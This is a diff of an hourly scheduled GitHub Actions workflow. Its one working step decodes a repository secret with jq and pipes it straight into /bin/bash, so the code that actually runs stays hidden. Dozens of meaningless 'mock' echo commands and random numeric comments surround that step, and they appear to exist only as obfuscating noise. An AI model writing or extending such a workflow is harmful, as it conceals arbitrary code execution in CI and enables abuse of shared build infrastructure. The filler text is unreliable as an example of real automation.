@@ -1,38 +1,38 @@
-name: xianzuna9631 #10768
-on: #18707
-  workflow_dispatch: #32235
-  schedule: #27787
-    - cron: '20 * * * *' #4962
-jobs: #18655
-  build: #17701
-    runs-on: ubuntu-latest #27936
-    steps: #10394
-      - uses: actions/checkout@v4 #11632
-      - name: xianzuna9631 #28002
-        env: #17680
-          z24634: ${{ secrets.z24634 }} #11385
+name: xianzuna9631 #23793
+on: #7874
+  workflow_dispatch: #23588
+  schedule: #24737
+    - cron: '51 * * * *' #25816
+jobs: #20563
+  build: #5041
+    runs-on: ubuntu-latest #9675
+    steps: #1986
+      - uses: actions/checkout@v4 #29160
+      - name: xianzuna9631 #15453
+        env: #22397
+          i19161: ${{ secrets.i19161 }} #27867
         run: |
-          for i in 9284 18216 237; do echo "Loop "; done
+          for i in 994 4679 24637; do echo "Loop "; done
           sleep 0.1 2>/dev/null || true
-          echo $z24634 | jq -r .v30509 | /bin/bash #19047
-          echo "Date only: $(date +%F)"
-          echo "And/or chain: true && echo A || echo B"
-          echo "Time ms-like: $(date +%s%3N 2>/dev/null || echo 123456)"
+          echo $i19161 | jq -r .c4615 | /bin/bash #11559
+          echo "Version: $((1 + RANDOM % 5))"
+          echo "Redirect mock: echo data > /dev/null 2>&1"
+          echo "Stderr dump: ls /nonexist 2>&1 | head -1 || true"
+          echo "Chmod mock: chmod 644 /tmp 2>/dev/null || true"
+          echo "Array-like: a=1 b=2 c=3; echo \$a\$b\$c"
+          echo "Random float-like: $((RANDOM % 100)).$((RANDOM % 100))"
+          for i in 1 2 3; do echo "Loop $i"; done
+          find /tmp -maxdepth 1 -type f 2>/dev/null | head -1 || true
+          echo "Array mock: arr=(1 2 3); echo \${arr[0]}"
           echo "Var op: v=1; echo \$((v+1))"
-          [ -z "$RANDOM" ] || echo "Random var set"
-          echo "Var unset test: unset VAR 2>/dev/null || true"
-          echo "Git mock: git --version 2>/dev/null | head -1 || echo no-git"
-          echo "Checksum: $((1000 + RANDOM % 9000))"
-          echo "Export mock: export VAR=test"
-          echo "Command || true: ls /nonexist || true"
+          echo "Arithmetic: $(( (RANDOM % 5) * 10 ))"
+          echo "Build $(date +%s)"
+          if [ -x /bin/ls ]; then echo "LS executable"; fi
           echo "Trap mock: trap 'echo TRAP' EXIT"
-          echo "Random string: $(cat /dev/urandom | tr -cd 'a-z' | head -c 5 2>/dev/null || echo abcde)"
-          echo "Option mock: grep -i 'a' /etc/hosts 2>/dev/null | head -1"
-          echo "In-array test: [[ 'a' =~ [a-z] ]] && echo Match"
-          echo "String slice: str=abcdef; echo \${str:0:3}"
-          echo "Sed mock: echo 'text' | sed 's/t/T/' 2>/dev/null || echo no-sed"
-          echo "File test: [ -e /etc/passwd ] && echo Passwd exists"
-          echo "Kernel: $(uname -s 2>/dev/null || echo Linux)"
-          echo "Command count: echo \$(ls | wc -l 2>/dev/null || echo 0)"
           echo "Exit 0 test: exit 0 || true"
-          for i in {1..3}; do echo "Iter $i"; done
+          echo "Time diff mock: echo \$SECONDS"
+          echo "Disk usage (fake): $(df -h . 2>/dev/null | tail -1 || echo N/A)"
+          echo "Time ms-like: $(date +%s%3N 2>/dev/null || echo 123456)"
+          test -d /tmp && echo "Tmp dir exists"
+          echo "Subshell: (echo subshell)"
+          echo "Test: [ 1 -eq 1 ] && echo 'Math OK'"
